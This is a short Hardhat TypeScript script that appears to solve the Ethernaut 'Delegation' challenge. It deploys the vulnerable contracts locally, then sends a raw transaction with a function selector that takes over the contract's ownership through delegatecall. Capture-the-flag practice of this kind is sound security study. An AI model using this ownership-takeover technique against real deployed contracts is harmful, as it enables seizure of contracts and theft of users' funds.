const hre = require("hardhat");
const {waffle} = require("hardhat");

import { Signer } from "ethers";
const ethers = hre.ethers;
const provider = waffle.provider;

async function main(){
    let user: Signer, hacker: Signer;

    [user, hacker] = await ethers.getSigners();
    console.log('User address', await user.getAddress());
    console.log('Hacker address', await hacker.getAddress());

    const Delegate = await ethers.getContractFactory("Delegate", user);
    const delegate = await Delegate.deploy(await user.getAddress());
    await delegate.deployed();

    const Attacker = await ethers.getContractFactory("Delegation", user);
    const attacker = await Attacker.deploy(delegate.address);
    await attacker.deployed();

    console.log('Initially, owner of delegate is', await attacker.owner());

    const tx = {
        from: await hacker.getAddress(),
        to: attacker.address,
        data: '0xdd365b8b'
    }

    const a = await hacker.sendTransaction(tx);
    console.log(await a.wait());

    console.log('Finally, owner of delegate is', await attacker.owner());

}

main().then(()=>process.exit(0))
    .catch((err)=>{
        console.log(err);
        process.exit(1);
    })
    